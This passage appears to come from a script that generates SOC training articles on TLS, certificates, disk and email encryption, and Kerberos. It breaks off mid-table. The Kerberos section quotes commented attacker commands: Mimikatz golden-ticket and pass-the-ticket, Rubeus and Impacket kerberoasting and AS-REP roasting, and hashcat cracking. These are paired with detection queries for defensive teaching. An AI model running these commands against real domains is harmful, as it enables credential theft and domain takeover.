| Logjam      | TLS         | Weak DH parameters (512-bit)            | Use 2048+ bit DH       |
| ROBOT       | TLS         | RSA padding oracle (Bleichenbacher)      | Disable RSA key exchange|
| DROWN       | SSLv2       | Cross-protocol attack on RSA             | Disable SSLv2          |
| Downgrade   | TLS         | Forces weaker protocol version           | Use TLS_FALLBACK_SCSV  |

## Testing TLS Configuration

```bash
# testssl.sh - comprehensive scanner
./testssl.sh https://example.com

# Check for specific vulnerabilities
./testssl.sh --heartbleed --poodle --beast --crime https://example.com

# sslyze
sslyze --regular example.com

# Check certificate transparency logs
curl "https://crt.sh/?q=example.com&output=json" | python3 -m json.tool

# Qualys SSL Labs (web-based)
# https://www.ssllabs.com/ssltest/
```

## Recommended TLS Configuration

```nginx
# Nginx example - modern configuration
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
ssl_prefer_server_ciphers off;
ssl_session_timeout 1d;
ssl_session_cache shared:SSL:10m;
ssl_stapling on;
ssl_stapling_verify on;
add_header Strict-Transport-Security "max-age=63072000" always;
```

```apache
# Apache example
SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1
SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256
SSLHonorCipherOrder off
SSLSessionTickets off
Header always set Strict-Transport-Security "max-age=63072000"
```

## SOC Analyst TLS Investigation Checklist

1. Check minimum TLS version (must be 1.2+)
2. Verify no weak cipher suites (RC4, DES, 3DES, NULL, EXPORT)
3. Confirm forward secrecy (ECDHE key exchange)
4. Validate certificate chain completeness
5. Check certificate expiration and revocation status
6. Verify HSTS header is present
7. Test for known vulnerabilities with testssl.sh
8. Review Certificate Transparency logs for unauthorized certs

## Key Takeaways

1. TLS 1.3 is faster (1-RTT) and removes all insecure legacy options
2. TLS 1.2 is acceptable with proper cipher suite configuration
3. Forward secrecy (ECDHE) protects past sessions if keys are later compromised
4. Disable SSL 2.0/3.0 and TLS 1.0/1.1 everywhere
5. Use testssl.sh or sslyze for comprehensive TLS auditing
6. OCSP Stapling improves both performance and privacy
"""
    ))

    # --------------------------------------------------------------------------
    # Article 7: Certificate Types Management and Troubleshooting
    # --------------------------------------------------------------------------
    articles.append((
        "Certificate Types Management and Troubleshooting",
        ["cryptography", "certificates", "pki", "ssl-certificates", "troubleshooting", "csr"],
        r"""# Certificate Types, Management, and Troubleshooting

## Overview

Certificates are the practical building blocks of PKI. SOC analysts must understand
certificate types, formats, and common issues to investigate alerts, troubleshoot
outages, and ensure compliance.

## Certificate Validation Levels

| Level                 | Validation                    | Issuance Time | Visual Indicator  | Cost     |
|-----------------------|-------------------------------|---------------|-------------------|----------|
| DV (Domain Validated) | Domain ownership only         | Minutes       | Padlock           | Free-$$  |
| OV (Org Validated)    | Domain + organization check   | 1-3 days      | Padlock + org info| $$       |
| EV (Extended Valid.)  | Full legal entity verification| 1-2 weeks     | Padlock + org info| $$$      |

**SOC Note**: Let's Encrypt issues free DV certificates. Attackers also use DV certs to
make phishing sites look legitimate. DV certs alone do not prove a site is safe.

## Certificate Types by Scope

| Type              | Covers                            | Example                    |
|-------------------|-----------------------------------|----------------------------|
| Single domain     | One FQDN                         | www.example.com            |
| Wildcard          | All subdomains at one level       | *.example.com              |
| SAN / Multi-domain| Multiple specific names           | example.com, api.example.com|
| Self-signed       | Anything (not trusted by default) | Internal testing           |

### Wildcard Limitations

```
*.example.com matches:
  - www.example.com      YES
  - mail.example.com     YES
  - api.example.com      YES
  - sub.www.example.com  NO  (does not match nested subdomains)
  - example.com          NO  (does not match bare domain)
```

## Certificate Formats

| Format    | Extension        | Encoding | Contains              | Common Use          |
|-----------|-----------------|----------|-----------------------|---------------------|
| PEM       | .pem, .crt, .cer| Base64   | Cert and/or key       | Linux, Apache       |
| DER       | .der, .cer      | Binary   | Single cert           | Java, Windows       |
| PFX/PKCS12| .pfx, .p12      | Binary   | Cert + private key    | Windows, IIS        |
| PKCS7     | .p7b, .p7c      | Base64   | Cert chain (no key)   | Windows, Java       |

### Format Conversion Commands

```bash
# PEM to DER
openssl x509 -in cert.pem -outform DER -out cert.der

# DER to PEM
openssl x509 -in cert.der -inform DER -outform PEM -out cert.pem

# PEM to PFX (combine cert + key + chain)
openssl pkcs12 -export -out cert.pfx -inkey private.key -in cert.pem -certfile chain.pem

# PFX to PEM (extract cert and key)
openssl pkcs12 -in cert.pfx -out cert.pem -nodes

# Extract just the certificate from PFX
openssl pkcs12 -in cert.pfx -clcerts -nokeys -out cert.pem

# Extract just the private key from PFX
openssl pkcs12 -in cert.pfx -nocerts -nodes -out key.pem

# PEM to PKCS7
openssl crl2pkcs7 -nocrl -certfile cert.pem -certfile chain.pem -out cert.p7b

# PKCS7 to PEM
openssl pkcs7 -in cert.p7b -print_certs -out cert.pem
```

## CSR Generation

```bash
# Standard RSA CSR
openssl req -new -newkey rsa:2048 -nodes -keyout domain.key -out domain.csr

# CSR with SAN (Subject Alternative Names)
openssl req -new -key domain.key -out domain.csr -config san.cnf

# Contents of san.cnf:
# [req]
# distinguished_name = req_dn
# req_extensions = v3_req
# [req_dn]
# CN = www.example.com
# [v3_req]
# subjectAltName = DNS:www.example.com,DNS:example.com,DNS:api.example.com

# Verify CSR
openssl req -in domain.csr -text -noout -verify

# Windows - generate CSR
certreq -new request.inf domain.csr
```

## Certificate Inspection

```bash
# View certificate details
openssl x509 -in cert.pem -text -noout

# Key fields to examine:
openssl x509 -in cert.pem -noout -subject -issuer -dates -serial -fingerprint

# Check certificate expiration
openssl x509 -in cert.pem -noout -enddate

# Check remote server certificate
echo | openssl s_client -servername example.com -connect example.com:443 2>/dev/null \
  | openssl x509 -noout -subject -issuer -dates

# Windows
certutil -dump cert.cer
```

## Certificate Renewal

```bash
# Check days until expiration
openssl x509 -in cert.pem -noout -checkend 2592000
# Exit code 0 = valid for 30 more days, 1 = expires within 30 days

# Certbot (Let's Encrypt) renewal
certbot renew --dry-run
certbot renew

# Automated renewal check script
DAYS=30
for cert in /etc/ssl/certs/*.pem; do
    if ! openssl x509 -in "$cert" -noout -checkend $((DAYS * 86400)) 2>/dev/null; then
        echo "EXPIRING SOON: $cert"
    fi
done
```

## Certificate Revocation

```bash
# Revoke with Let's Encrypt
certbot revoke --cert-path /etc/letsencrypt/live/example.com/cert.pem

# Check revocation via OCSP
openssl ocsp -issuer chain.pem -cert cert.pem -url http://ocsp.example.com

# Check CRL
openssl crl -in crl.pem -text -noout | grep -A1 "Serial Number"
```

## Common Errors and Fixes

| Error Message                                    | Cause                         | Fix                                  |
|-------------------------------------------------|-------------------------------|--------------------------------------|
| `SSL_ERROR_BAD_CERT_DOMAIN`                     | Hostname mismatch             | Reissue with correct SAN/CN          |
| `CERT_HAS_EXPIRED`                              | Certificate past NotAfter     | Renew certificate                    |
| `UNABLE_TO_VERIFY_LEAF_SIGNATURE`               | Missing intermediate cert     | Include full chain in config         |
| `DEPTH_ZERO_SELF_SIGNED_CERT`                   | Self-signed, not trusted      | Use CA-issued cert or add to trust   |
| `ERR_CERT_REVOKED`                              | Certificate was revoked       | Issue new certificate                |
| `SSL_ERROR_WEAK_SERVER_EPHEMERAL_DH_KEY`        | DH params too small           | Use 2048+ bit DH or ECDHE           |
| `ERR_SSL_VERSION_OR_CIPHER_MISMATCH`            | No common cipher/version      | Update server TLS config             |
| `certificate verify failed: unable to get local issuer certificate` | Missing CA in trust store | Add CA cert to trust store |

## Troubleshooting Workflow

```bash
# Step 1: Check what the server sends
openssl s_client -connect server:443 -servername server

# Step 2: Verify chain completeness
openssl s_client -connect server:443 2>&1 | grep -E "Verify|depth"

# Step 3: Check certificate details
echo | openssl s_client -connect server:443 2>/dev/null | openssl x509 -text -noout

# Step 4: Test specific issues
# Key and cert match?
openssl x509 -noout -modulus -in cert.pem | md5sum
openssl rsa -noout -modulus -in key.pem | md5sum
# Both MD5 sums must match

# Step 5: Test with curl for detailed errors
curl -vI https://server 2>&1 | grep -E "SSL|certificate|verify"
```

## Windows Certificate Management

```powershell
# List certificates in the local machine store
Get-ChildItem Cert:\LocalMachine\My

# Check expiring certificates (next 30 days)
Get-ChildItem Cert:\LocalMachine\My | Where-Object {
    $_.NotAfter -lt (Get-Date).AddDays(30) -and $_.NotAfter -gt (Get-Date)
} | Select-Object Subject, NotAfter

# Import a PFX certificate
Import-PfxCertificate -FilePath cert.pfx -CertStoreLocation Cert:\LocalMachine\My -Password (ConvertTo-SecureString "pass" -AsPlainText -Force)

# Export a certificate
Export-Certificate -Cert Cert:\LocalMachine\My\THUMBPRINT -FilePath cert.cer

# Remove expired certificates
Get-ChildItem Cert:\LocalMachine\My | Where-Object { $_.NotAfter -lt (Get-Date) } | Remove-Item
```

## Key Takeaways

1. DV certificates only prove domain ownership, not trustworthiness
2. Always include intermediate certificates in server deployments
3. PEM is the most common format on Linux; PFX on Windows
4. Automate certificate monitoring to prevent surprise expirations
5. Verify key-certificate match before deployment (modulus check)
6. Know the conversion commands between PEM, DER, PFX, and PKCS7
"""
    ))

    # --------------------------------------------------------------------------
    # Article 8: Disk and File Encryption BitLocker LUKS VeraCrypt
    # --------------------------------------------------------------------------
    articles.append((
        "Disk and File Encryption BitLocker LUKS VeraCrypt",
        ["cryptography", "disk-encryption", "bitlocker", "luks", "veracrypt", "encryption-at-rest"],
        r"""# Disk and File Encryption: BitLocker, LUKS, VeraCrypt

## Overview

Encryption at rest protects data stored on disks, USB drives, and other media. If a device
is lost, stolen, or decommissioned, encryption prevents unauthorized access to the data.
This is a compliance requirement for PCI DSS, HIPAA, GDPR, and most security frameworks.

## Full Disk Encryption (FDE) Concepts

| Concept          | Description                                              |
|-----------------|----------------------------------------------------------|
| FDE              | Entire disk encrypted, transparent to user               |
| FBE              | File-Based Encryption, individual files/folders          |
| DEK              | Data Encryption Key - encrypts the actual data           |
| KEK              | Key Encryption Key - wraps/protects the DEK              |
| TPM              | Trusted Platform Module - hardware key storage           |
| Pre-boot auth    | Authentication required before OS loads                  |
| Recovery key     | Emergency access if primary auth fails                   |

### How FDE Works

```
Boot Process with FDE:
1. BIOS/UEFI starts
2. Pre-boot environment loads (BitLocker, GRUB+LUKS)
3. User authenticates (PIN, password, TPM, USB key)
4. KEK is unlocked, which decrypts the DEK
5. DEK decrypts disk sectors in real-time as they are read
6. OS boots normally, encryption is transparent
```

## BitLocker (Windows)

### Requirements

- Windows Pro, Enterprise, or Education (not Home)
- TPM 1.2 or 2.0 (recommended) or USB startup key
- UEFI or legacy BIOS with TPM

### Protection Modes

| Mode               | Security Level | Requirements         |
|-------------------|---------------|----------------------|
| TPM only          | Basic          | TPM chip             |
| TPM + PIN         | Strong         | TPM + user PIN       |
| TPM + USB key     | Strong         | TPM + USB drive      |
| TPM + PIN + USB   | Maximum        | All three factors    |
| USB key only      | Moderate       | No TPM needed        |

### BitLocker Commands

```powershell
# Check BitLocker status
manage-bde -status

# Enable BitLocker on C: with TPM + PIN
manage-bde -on C: -TPMAndPIN

# Enable BitLocker with recovery key backup to AD
manage-bde -on C: -RecoveryPassword -RecoveryKey E:\

# Get recovery key
manage-bde -protectors -get C:

# Suspend BitLocker (for updates)
manage-bde -pause C:
manage-bde -resume C:

# Lock/unlock a data drive
manage-bde -lock D:
manage-bde -unlock D: -RecoveryPassword 123456-123456-123456-123456-123456-123456-123456-123456

# PowerShell alternatives
Get-BitLockerVolume
Enable-BitLocker -MountPoint "C:" -EncryptionMethod XtsAes256 -TpmProtector
```

### BitLocker Group Policy Settings

| Policy                              | Recommended Setting              |
|------------------------------------|----------------------------------|
| Encryption method                  | XTS-AES 256-bit                  |
| Require pre-boot authentication    | TPM + PIN                        |
| Recovery key backup                | AD DS or Azure AD                |
| Removable drive encryption         | Required for write access        |
| Minimum PIN length                 | 8+ characters                    |

```
Group Policy Path:
Computer Configuration > Administrative Templates > Windows Components > BitLocker Drive Encryption
```

### BitLocker Recovery

```powershell
# Find recovery key in AD (requires AD admin)
Get-ADObject -Filter 'objectclass -eq "msFVE-RecoveryInformation"' -SearchBase "OU=Computers,DC=example,DC=com" -Properties msFVE-RecoveryPassword

# Backup recovery key to Azure AD
BackupToAAD-BitLockerKeyProtector -MountPoint "C:" -KeyProtectorId $keyProtectorId
```

## LUKS (Linux Unified Key Setup)

LUKS is the standard for Linux disk encryption, built on dm-crypt.

### LUKS Setup

```bash
# Install cryptsetup
apt install cryptsetup   # Debian/Ubuntu
yum install cryptsetup   # RHEL/CentOS

# Create LUKS encrypted partition
cryptsetup luksFormat /dev/sdb1
# Enter and confirm passphrase

# Open (unlock) the encrypted partition
cryptsetup open /dev/sdb1 secure_data

# Create filesystem on the mapped device
mkfs.ext4 /dev/mapper/secure_data

# Mount
mount /dev/mapper/secure_data /mnt/secure

# Close (lock)
umount /mnt/secure
cryptsetup close secure_data
```

### LUKS Key Management

```bash
# Add a key slot (up to 8 slots, numbered 0-7)
cryptsetup luksAddKey /dev/sdb1

# Remove a key slot
cryptsetup luksRemoveKey /dev/sdb1

# View LUKS header info
cryptsetup luksDump /dev/sdb1

# Backup LUKS header (CRITICAL for recovery)
cryptsetup luksHeaderBackup /dev/sdb1 --header-backup-file /root/luks_header_backup

# Restore LUKS header
cryptsetup luksHeaderRestore /dev/sdb1 --header-backup-file /root/luks_header_backup
```

### Auto-mount at Boot

```bash
# /etc/crypttab entry
# name    device          keyfile     options
secure    /dev/sdb1       none        luks

# /etc/fstab entry
/dev/mapper/secure    /mnt/secure    ext4    defaults    0    2
```

## VeraCrypt

VeraCrypt is a cross-platform, open-source encryption tool (successor to TrueCrypt).

### Features

| Feature              | Description                                    |
|---------------------|------------------------------------------------|
| Volume encryption   | Create encrypted file containers               |
| Partition encryption| Encrypt entire partitions or drives            |
| System encryption   | Full disk encryption with pre-boot auth        |
| Hidden volumes      | Plausible deniability with hidden encrypted area|
| Keyfiles            | Use files as additional authentication factor   |

### VeraCrypt CLI (Linux)

```bash
# Create an encrypted volume (500MB)
veracrypt -t -c --size=500M --encryption=AES-256 --hash=SHA-512 --filesystem=ext4 /path/to/volume.vc

# Mount a VeraCrypt volume
veracrypt /path/to/volume.vc /mnt/veracrypt

# Dismount
veracrypt -d /mnt/veracrypt

# Dismount all
veracrypt -d

# List mounted volumes
veracrypt -t -l
```

### Hidden Volumes (Plausible Deniability)

```
Standard Volume (outer):
  Contains: Decoy files (non-sensitive)
  Passphrase: "outer_password"

Hidden Volume (inside outer):
  Contains: Actual sensitive files
  Passphrase: "hidden_password"

If compelled to reveal the password, give the outer password.
The hidden volume is undetectable without its passphrase.
```

## Encryption at Rest Comparison

| Feature           | BitLocker    | LUKS         | VeraCrypt       |
|-------------------|-------------|-------------|-----------------|
| Platform          | Windows     | Linux       | Cross-platform  |
| Algorithm         | AES-128/256 | AES, Serpent, Twofish | AES, Serpent, Twofish, Camellia |
| TPM support       | Yes         | Limited     | No              |
| AD integration    | Yes         | No          | No              |
| Hidden volumes    | No          | No          | Yes             |
| Pre-boot auth     | Yes         | Yes         | Yes             |
| Open source       | No          | Yes         | Yes             |
| Key slots         | N/A         | 8           | N/A             |

## SOC Analyst Checklist

```
Encryption at Rest Verification:
[ ] All laptops have FDE enabled (BitLocker/LUKS/FileVault)
[ ] Recovery keys are backed up centrally (AD, Azure AD, escrow)
[ ] Encryption algorithm is AES-256 (not AES-128 for compliance)
[ ] Pre-boot authentication is enforced (not TPM-only)
[ ] Removable media encryption policy is enforced
[ ] Server data volumes are encrypted
[ ] Database encryption is enabled (TDE or column-level)
[ ] Cloud storage encryption is verified (SSE, CSE)
[ ] Decommissioned drives are cryptographically wiped
```

### Forensic Considerations

```bash
# Check if a Linux disk is LUKS encrypted
cryptsetup isLuks /dev/sda1 && echo "LUKS encrypted"
file /dev/sda1  # Shows "LUKS encrypted file"

# Check BitLocker status remotely (AD admin)
manage-bde -status -ComputerName WORKSTATION01

# VeraCrypt volumes appear as normal files
file volume.vc  # Shows "data" (no identifying header by design)
```

## Key Takeaways

1. FDE is mandatory for laptops and portable devices
2. BitLocker with TPM + PIN is the Windows standard
3. LUKS is the Linux standard; always backup the LUKS header
4. VeraCrypt provides cross-platform encryption with hidden volumes
5. Recovery key management is critical; lost keys mean lost data
6. Encryption at rest is a compliance requirement in every major framework
"""
    ))

    # --------------------------------------------------------------------------
    # Article 9: Email Encryption S/MIME and PGP
    # --------------------------------------------------------------------------
    articles.append((
        "Email Encryption S/MIME and PGP",
        ["cryptography", "email-encryption", "smime", "pgp", "gpg", "email-security"],
        r"""# Email Encryption: S/MIME and PGP

## Overview

Email is sent in plaintext by default. Email encryption protects message confidentiality
and provides authentication through digital signatures. Two standards dominate:
S/MIME (certificate-based) and PGP/GPG (key-based).

## Why Encrypt Email?

| Threat                   | Without Encryption              | With Encryption              |
|-------------------------|--------------------------------|-------------------------------|
| Network interception    | Email readable in transit       | Encrypted, unreadable         |
| Server compromise       | All stored emails exposed       | Encrypted at rest             |
| Man-in-the-middle       | Can read and modify             | Tampering detected            |
| Spoofing                | No sender verification          | Digital signature proves sender|
| Legal/compliance        | Potential data breach           | Protected (HIPAA, GDPR, etc.) |

## Encryption vs Signing

```
Signing only:    Readable by anyone, but proves sender identity and integrity
Encrypting only: Unreadable except by recipient, but no sender proof
Sign + Encrypt:  Both confidentiality and authentication (recommended)
```

| Operation   | What It Proves                    | Key Used                  |
|-------------|-----------------------------------|---------------------------|
| Sign        | Message is from claimed sender    | Sender's private key      |
| Verify      | Signature is valid                | Sender's public key/cert  |
| Encrypt     | Only recipient can read           | Recipient's public key/cert|
| Decrypt     | Access to encrypted content       | Recipient's private key   |

## S/MIME (Secure/Multipurpose Internet Mail Extensions)

S/MIME uses X.509 certificates issued by Certificate Authorities, integrating with
existing PKI infrastructure.

### How S/MIME Works

```
Sending signed + encrypted email:
1. Sender hashes message, signs hash with private key
2. Sender encrypts message + signature with recipient's public cert
3. Recipient decrypts with private key
4. Recipient verifies signature with sender's public cert
```

### Getting an S/MIME Certificate

| Provider          | Type    | Cost    | Notes                    |
|-------------------|---------|---------|--------------------------|
| Let's Encrypt     | N/A     | N/A     | Does not issue S/MIME    |
| Sectigo/Comodo    | DV/OV   | Free-$$ | Free personal email cert |
| DigiCert          | OV/EV   | $$-$$$  | Enterprise               |
| GlobalSign        | OV      | $$      | Enterprise               |
| Your enterprise CA| Any     | Free    | Internal PKI             |

### S/MIME Setup in Outlook

```
1. Obtain S/MIME certificate (.pfx file)
2. Import into Windows certificate store (double-click .pfx)
3. Outlook > File > Options > Trust Center > Email Security
4. Under Encrypted email > Settings:
   - Select signing certificate
   - Select encryption certificate
   - Choose SHA-256 hash algorithm
5. New email > Options > Sign / Encrypt buttons
```

### S/MIME with OpenSSL

```bash
# Generate S/MIME key and self-signed certificate
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout email.key -out email.crt \
  -subj "/C=US/ST=CA/O=MyOrg/emailAddress=user@example.com"

# Sign an email
openssl smime -sign -in message.txt -out signed.eml -signer email.crt -inkey email.key -text

# Verify a signed email
openssl smime -verify -in signed.eml -CAfile ca_chain.pem

# Encrypt an email
openssl smime -encrypt -in message.txt -out encrypted.eml -recip recipient.crt -aes256

# Decrypt an email
openssl smime -decrypt -in encrypted.eml -inkey recipient.key -out decrypted.txt
```

## PGP/GPG (Pretty Good Privacy / GNU Privacy Guard)

PGP uses a decentralized trust model. Users generate their own key pairs and establish
trust through a "Web of Trust" rather than centralized CAs.

### GPG Key Management

```bash
# Generate a new key pair
gpg --full-generate-key
# Select: RSA and RSA, 4096 bits, expiration as desired

# List keys
gpg --list-keys
gpg --list-secret-keys

# Export public key (share with others)
gpg --export --armor user@example.com > publickey.asc

# Import someone's public key
gpg --import theirkey.asc

# Verify a key fingerprint
gpg --fingerprint user@example.com

# Upload to keyserver
gpg --keyserver hkps://keys.openpgp.org --send-keys KEY_ID

# Search and import from keyserver
gpg --keyserver hkps://keys.openpgp.org --search-keys user@example.com
```

### Encrypting and Signing with GPG

```bash
# Encrypt a file for a recipient
gpg --encrypt --recipient user@example.com --armor secret.txt
# Creates secret.txt.asc

# Decrypt a file
gpg --decrypt secret.txt.asc > secret.txt

# Sign a message (cleartext)
gpg --clearsign message.txt

# Sign and encrypt
gpg --sign --encrypt --recipient user@example.com message.txt

# Verify a signature
gpg --verify message.txt.sig message.txt

# Detached signature
gpg --detach-sign --armor document.pdf
gpg --verify document.pdf.asc document.pdf
```

### Web of Trust

```
Trust Model:
- You sign keys of people whose identity you have verified
- If Alice trusts Bob, and Bob trusts Carol, Alice can transitively trust Carol
- Trust levels: Unknown, None, Marginal, Full, Ultimate

Signing a key:
gpg --sign-key user@example.com

Setting trust level:
gpg --edit-key user@example.com
> trust
> (select trust level)
> save
```

## S/MIME vs PGP Comparison

| Feature            | S/MIME                      | PGP/GPG                     |
|--------------------|-----------------------------|-----------------------------|
| Trust model        | Hierarchical (CA-based)     | Decentralized (Web of Trust)|
| Certificate source | Certificate Authority       | Self-generated               |
| Client support     | Outlook, Apple Mail, native | Thunderbird + plugin, CLI    |
| Enterprise use     | Excellent (AD integration)  | Limited (manual management)  |
| Setup complexity   | Medium (need CA cert)       | High (key exchange manual)   |
| Key revocation     | CRL / OCSP (automated)     | Revocation cert (manual)     |
| Cost               | May require paid cert       | Free                         |
| Standard           | IETF RFC 8551              | OpenPGP RFC 4880             |

## Email Security Headers

```
# Check email authentication headers in message source:

Authentication-Results: mx.google.com;
    dkim=pass header.d=example.com;
    spf=pass smtp.mailfrom=user@example.com;
    dmarc=pass header.from=example.com

# These are not encryption but complement it:
# SPF   - Verifies sender IP is authorized
# DKIM  - Cryptographic signature on email headers/body
# DMARC - Policy for handling SPF/DKIM failures
```

## SOC Analyst Email Investigation

```bash
# Check if an email is S/MIME signed/encrypted
# Look for Content-Type in raw headers:
# - application/pkcs7-signature  (signed)
# - application/pkcs7-mime       (encrypted)
# - multipart/signed             (clear-signed)

# Verify S/MIME signature from command line
openssl smime -verify -in email.eml -CAfile ca_chain.pem -purpose smimesign

# Extract certificate from signed email
openssl smime -verify -in email.eml -noverify -signer sender_cert.pem

# View certificate details
openssl x509 -in sender_cert.pem -text -noout

# GPG: verify a signed email
gpg --verify message.eml
```

## Implementation Recommendations

| Environment       | Recommendation                     |
|------------------|------------------------------------|
| Enterprise (Windows) | S/MIME with enterprise CA, Outlook |
| Enterprise (Mixed)   | S/MIME or consider gateway encryption |
| Individual/Technical  | GPG with Thunderbird              |
| Compliance required   | S/MIME (easier audit trail)       |
| High security         | GPG (no CA trust dependency)      |
| Automated/API         | GPG (scriptable)                  |

## Key Takeaways

1. S/MIME integrates with enterprise PKI and is native in Outlook
2. PGP/GPG is decentralized and free but harder to manage at scale
3. Sign+Encrypt is the recommended practice for sensitive email
4. Email encryption does not replace SPF/DKIM/DMARC (different layers)
5. Key management is the biggest challenge for both systems
6. Consider email gateway encryption for organization-wide deployment
"""
    ))

    # --------------------------------------------------------------------------
    # Article 10: Kerberos Authentication Deep Dive
    # --------------------------------------------------------------------------
    articles.append((
        "Kerberos Authentication Deep Dive",
        ["cryptography", "kerberos", "authentication", "active-directory", "tickets", "kdc"],
        r"""# Kerberos Authentication Deep Dive

## Overview

Kerberos is the default authentication protocol in Windows Active Directory environments.
It uses symmetric key cryptography and a trusted third party (Key Distribution Center) to
authenticate users and services without sending passwords over the network.

## Core Components

| Component              | Role                                         |
|-----------------------|----------------------------------------------|
| KDC (Key Distribution Center) | Central authentication server (DC in AD) |
| AS (Authentication Service)   | Part of KDC, issues TGTs                |
| TGS (Ticket Granting Service) | Part of KDC, issues service tickets      |
| TGT (Ticket Granting Ticket)  | Proves identity to request service tickets|
| Service Ticket (ST)   | Grants access to a specific service           |
| PAC (Privilege Attribute Cert) | Contains user group memberships          |
| Realm                 | Kerberos domain (often AD domain name)        |
| Principal             | Unique identity (user or service)             |
| Keytab                | File containing service principal keys         |

## Authentication Flow Step by Step

```
Step 1: AS-REQ (Authentication Service Request)
  Client -> KDC:  "I am user@DOMAIN, here is a timestamp encrypted with my password hash"

Step 2: AS-REP (Authentication Service Reply)
  KDC -> Client:  [TGT encrypted with krbtgt hash] + [Session Key encrypted with user's hash]
  Note: Client decrypts session key with password hash. TGT cannot be decrypted by client.

Step 3: TGS-REQ (Ticket Granting Service Request)
  Client -> KDC:  [TGT] + "I want access to HTTP/webserver"

Step 4: TGS-REP (Ticket Granting Service Reply)
  KDC -> Client:  [Service Ticket encrypted with service account hash] + [Service Session Key]

Step 5: AP-REQ (Application Request)
  Client -> Service:  [Service Ticket] + [Authenticator encrypted with service session key]

Step 6: AP-REP (Application Reply) - optional
  Service -> Client:  Confirms mutual authentication
```

### Detailed Flow Diagram

```
  User                    KDC (Domain Controller)           Service
   |                           |                              |
   |--AS-REQ (username)------->|                              |
   |<--AS-REP (TGT + key)-----|                              |
   |                           |                              |
   |--TGS-REQ (TGT + SPN)--->|                              |
   |<--TGS-REP (ST + key)----|                              |
   |                           |                              |
   |--AP-REQ (ST + auth)----->|----->Service validates ticket |
   |<--AP-REP (mutual auth)---|<-----|                        |
```

## PAC (Privilege Attribute Certificate)

The PAC is embedded in every Kerberos ticket and contains:

- User SID
- Group SIDs (all group memberships)
- Logon information
- Signature (signed by KDC)

The PAC is how services know what groups a user belongs to without querying AD directly.

## Kerberos Delegation

| Type                    | Description                                    | Risk Level |
|------------------------|------------------------------------------------|------------|
| Unconstrained          | Service can impersonate user to ANY service    | HIGH       |
| Constrained            | Service can impersonate user to SPECIFIC services | Medium  |
| Resource-based constrained | Target service controls who can delegate to it | Lower   |

```powershell
# Find unconstrained delegation (dangerous)
Get-ADComputer -Filter {TrustedForDelegation -eq $true}
Get-ADUser -Filter {TrustedForDelegation -eq $true}

# Find constrained delegation
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

## Kerberos Attacks

### Golden Ticket Attack

The attacker obtains the **krbtgt account hash** and forges TGTs for any user.

```
Impact: Complete domain compromise
Requires: krbtgt NTLM hash (from DCSync, ntds.dit extraction)
Duration: Valid until krbtgt password changed TWICE

Detection:
- TGT with abnormally long lifetime
- TGT for nonexistent users
- Event ID 4769 with unusual encryption types
```

```bash
# Mimikatz golden ticket creation (attacker tool - for understanding detection)
# kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Detection: Look for Event ID 4769 where:
# - Ticket Encryption Type is 0x17 (RC4) when environment uses AES
# - Service Name is krbtgt
# - Account Name doesn't match known accounts
```

### Silver Ticket Attack

The attacker obtains a **service account hash** and forges service tickets.

```
Impact: Access to specific service only
Requires: Service account NTLM hash
Detection: Harder than Golden Ticket (no KDC interaction)

Detection:
- Service ticket without corresponding TGS-REQ in DC logs
- Event ID 4624 logon without 4768/4769 on DC
- PAC validation failures
```

### Kerberoasting

Request service tickets for accounts with SPNs, then crack them offline.

```powershell
# Find accounts with SPNs (potential targets)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Request service ticket (legitimate operation)
# The ticket is encrypted with the service account's hash
# Attacker extracts and cracks offline

# Rubeus (attacker tool)
# Rubeus.exe kerberoast /outfile:hashes.txt
```

```bash
# Impacket (Linux)
# GetUserSPNs.py -request -dc-ip 10.0.0.1 DOMAIN/user:password

# Crack with hashcat
# hashcat -m 13100 hashes.txt wordlist.txt
```

### AS-REP Roasting

Target accounts with "Do not require Kerberos preauthentication" enabled.

```powershell
# Find vulnerable accounts
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}

# Impacket
# GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1
```

### Pass-the-Ticket

Steal and reuse Kerberos tickets from memory.

```bash
# Mimikatz: export tickets from memory
# sekurlsa::tickets /export

# Inject ticket into current session
# kerberos::ptt ticket.kirbi
```

## Detection and Monitoring

### Critical Event IDs

| Event ID | Description                     | Watch For                     |
|----------|--------------------------------|-------------------------------|
| 4768     | TGT requested (AS-REQ)        | Unusual times, disabled accts |
| 4769     | Service ticket requested       | RC4 encryption, sensitive SPNs|
| 4770     | TGT renewed                   | Abnormal renewal patterns     |
| 4771     | Kerberos pre-auth failed       | Brute force attempts          |
| 4773     | Ticket request failed          | Anomalous failures            |

### Detection Queries (SIEM)

```
# Kerberoasting detection (service ticket with RC4 for user accounts)
EventID=4769 AND TicketEncryptionType=0x17 AND ServiceName!="krbtgt" AND ServiceName!="$*"

# Golden ticket detection (TGT anomalies)
EventID=4769 AND TicketOptions=0x40810000

# AS-REP Roasting
EventID=4768 AND PreAuthType=0

# Unusual TGT lifetime
EventID=4768 AND TicketLifetime > normal_max
```

## Kerberos Configuration Best Practices

```powershell
# Enforce AES encryption (disable RC4 where possible)
# Group Policy: Computer Configuration > Windows Settings > Security Settings >
#   Local Policies > Security Options >
#   "Network security: Configure encryption types allowed for Kerberos"
#   Enable: AES128, AES256  Disable: DES, RC4

# Set strong passwords for service accounts
# Use Group Managed Service Accounts (gMSA) where possible
New-ADServiceAccount -Name svc_web -DNSHostName svc_web.corp.local -PrincipalsAllowedToRetrieveManagedPassword WebServers$

# Reset krbtgt password twice (after Golden Ticket compromise)
# Wait for replication between resets
Reset-KrbtgtKeyInteractive  # Or use Microsoft's krbtgt reset script
```

## Kerberos vs NTLM

| Feature          | Kerberos                    | NTLM                       |
|-----------------|-----------------------------|-----------------------------|
| Authentication  | Ticket-based (3rd party)    | Challenge-response (direct) |
| Mutual auth     | Yes                         | No                          |
| Delegation      | Yes                         | Limited                     |
| Encryption      | AES-256, AES-128            | RC4 (weak)                  |
